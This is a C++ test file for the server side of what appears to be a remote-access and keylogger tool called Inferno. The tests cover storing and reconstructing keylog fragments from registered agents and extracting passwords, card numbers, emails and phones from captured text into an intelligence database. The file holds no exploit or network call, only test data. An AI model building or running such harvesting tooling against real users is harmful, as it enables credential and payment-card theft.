#include "../server/include/Analysis.hpp"
#include "../server/include/Inferno_Database.hpp"
#include <iostream>
#include <cassert>
#include <QUuid>

void test_analysis_luhn_validation() {
    std::cout << "[TEST] Testing Luhn Algorithm validation..." << std::endl;

    // Valid Luhn numbers
    assert(inferno::Analysis::validateLuhn("49927398716") && "49927398716 should be valid");
    assert(inferno::Analysis::validateLuhn("4111111111111111") && "Visa card should be valid");
    assert(inferno::Analysis::validateLuhn("378282246310005") && "Amex card should be valid");

    // Invalid Luhn numbers
    assert(!inferno::Analysis::validateLuhn("49927398717") && "Incorrect check digit should fail");
    assert(!inferno::Analysis::validateLuhn("1234567812345678") && "Random sequence should fail");

    std::cout << "[PASS] Luhn validation verified." << std::endl;
}

void test_analysis_data_extraction() {
    std::cout << "[TEST] Testing Regex extraction engines..." << std::endl;

    std::string sample = 
        "Hi operator, my email is admin@inferno.io and phone number is +33 6 12 34 56 78.\n"
        "I was testing card Visa 4111-1111-1111-1111 and Mastercard 5105 1051 0510 5100.\n"
        "Here are some bad strings: 1234-5678-1234-5678 (invalid card), test@fail (invalid email).\n"
        "We also logged: password: MySecretPassword123 and user login: operator_admin pwd=OperatorPass!\n"
        "Keylogger trace: user123[TAB]SecretKeylogPass[ENTER] some random text.";

    // 1. Email Extraction
    auto emails = inferno::Analysis::extractEmails(sample);
    assert(emails.size() == 1 && "Should extract exactly 1 email");
    assert(emails[0] == "admin@inferno.io" && "Email value mismatch");

    // 2. Phone Extraction
    auto phones = inferno::Analysis::extractPhones(sample);
    assert(phones.size() >= 1 && "Should extract at least 1 phone number");
    bool phone_found = false;
    for (const auto& p : phones) {
        if (p.find("6 12 34 56 78") != std::string::npos) phone_found = true;
    }
    assert(phone_found && "Phone value mismatch");

    // 3. Credit Card Extraction
    auto cards = inferno::Analysis::extractCreditCards(sample);
    assert(cards.size() >= 1 && "Should extract at least 1 valid card");
    bool card_found = false;
    for (const auto& c : cards) {
        if (c.find("4111-1111-1111-1111") != std::string::npos) card_found = true;
    }
    assert(card_found && "Valid Visa card should be extracted");

    // 4. Password Extraction
    auto passwords = inferno::Analysis::extractPasswords(sample);
    assert(passwords.size() >= 2 && "Should extract at least 2 password candidates");
    
    bool kw_found = false;
    bool seq_found = false;
    for (const auto& p : passwords) {
        if (p.first == "MySecretPassword123") kw_found = true;
        if (p.first == "SecretKeylogPass") seq_found = true;
    }
    assert(kw_found && "Keyword password mismatch");
    assert(seq_found && "Keylogger sequence password mismatch");

    std::cout << "[PASS] Data extraction verified." << std::endl;
}

void test_analysis_db_persistence() {
    std::cout << "[TEST] Testing Database Intelligence operations..." << std::endl;

    QString test_uuid = "TEST-INTEL-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    
    // Register agent (required for foreign keys)
    int agentId = inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "IntelBox", "Linux");
    assert(agentId > 0 && "Agent registration failed");

    // Log findings
    bool r1 = inferno::Inferno_Database::instance().logIntelligence(test_uuid, "EMAIL", "target@domain.com", "Found in console");
    assert(r1 && "Email log failed");

    // Log duplicate - should succeed but be ignored via UPSERT/ON CONFLICT
    bool r2 = inferno::Inferno_Database::instance().logIntelligence(test_uuid, "EMAIL", "target@domain.com", "Found in console duplicate");
    assert(r2 && "Duplicate log should return success");

    // Fetch findings
    auto list = inferno::Inferno_Database::instance().getIntelligence(test_uuid);
    assert(list.size() == 1 && "Database should only have 1 unique email due to uniqueness constraint");
    assert(list[0].value == "target@domain.com" && "Value mismatch in retrieved intel");
    assert(list[0].dataType == "EMAIL" && "Type mismatch in retrieved intel");

    // Clear findings
    bool r3 = inferno::Inferno_Database::instance().clearIntelligence(test_uuid);
    assert(r3 && "Clear intelligence failed");

    auto empty_list = inferno::Inferno_Database::instance().getIntelligence(test_uuid);
    assert(empty_list.isEmpty() && "Intel list should be empty after clear");

    std::cout << "[PASS] Database persistence verified." << std::endl;
}

void test_analysis_backspace_filtering() {
    std::cout << "[TEST] Testing Backspace filtering..." << std::endl;

    assert(inferno::Analysis::filterBackspaces("y[BACKSPACE]uper") == "uper" && "y[BACKSPACE]uper failed");
    assert(inferno::Analysis::filterBackspaces("abc[BACKSPACE][BACKSPACE]") == "a" && "Double backspace failed");
    assert(inferno::Analysis::filterBackspaces("[TAB]sy[BACKSPACE]uper[ENTER]") == "[TAB]super[ENTER]" && "Reconstruction with tags failed");
    assert(inferno::Analysis::filterBackspaces("[BACKSPACE]test") == "test" && "Prefix backspace failed");
    assert(inferno::Analysis::filterBackspaces("test[BACKSPACE]") == "tes" && "Suffix backspace failed");
    assert(inferno::Analysis::filterBackspaces("") == "" && "Empty string failed");

    std::cout << "[PASS] Backspace filtering verified." << std::endl;
}

void test_analysis_chronological_keylogs() {
    std::cout << "[TEST] Testing Chronological Keylog Reconstruction..." << std::endl;

    QString test_uuid = "TEST-CHRON-" + QUuid::createUuid().toString(QUuid::WithoutBraces).left(8);
    
    // Register agent
    int agentId = inferno::Inferno_Database::instance().registerAgent(test_uuid, "127.0.0.1", "ChronBox", "Linux");
    assert(agentId > 0 && "Agent registration failed");

    // Log keylogs in fragments
    assert(inferno::Inferno_Database::instance().logKeylog(test_uuid, "myusername[TAB]Se"));
    assert(inferno::Inferno_Database::instance().logKeylog(test_uuid, "cretSuperPass"));
    assert(inferno::Inferno_Database::instance().logKeylog(test_uuid, "word123[ENTER]"));

    // Fetch and check chronological reconstruction
    QString reconstructed = inferno::Inferno_Database::instance().getRawKeylogsChronological(test_uuid);
    assert(reconstructed == "myusername[TAB]SecretSuperPassword123[ENTER]" && "Reconstruction string mismatch");

    std::cout << "[PASS] Chronological keylog reconstruction verified." << std::endl;
}
